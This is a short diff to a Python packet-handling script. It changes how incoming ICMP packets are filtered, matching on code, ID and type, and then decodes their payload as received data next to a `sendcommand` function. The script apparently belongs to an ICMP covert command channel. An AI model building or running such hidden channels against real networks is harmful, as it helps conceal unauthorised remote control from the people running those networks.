@@ -47,7 +47,7 @@ def sendcommand(cmd):
 
 def packet_callback(packet):
     global destination_ip, destination_mac
-    if packet[ICMP].chksum == -1 and packet[ICMP].id == config.ID and packet[ICMP].type == config.TYPE:
+    if packet[ICMP].code == -1 and packet[ICMP].id == config.ID and packet[ICMP].type == config.TYPE:
         destination_ip = packet[IP].src
         #destination_mac = packet[Ether].src
         received_data = packet[ICMP].payload.load.decode('utf-8')
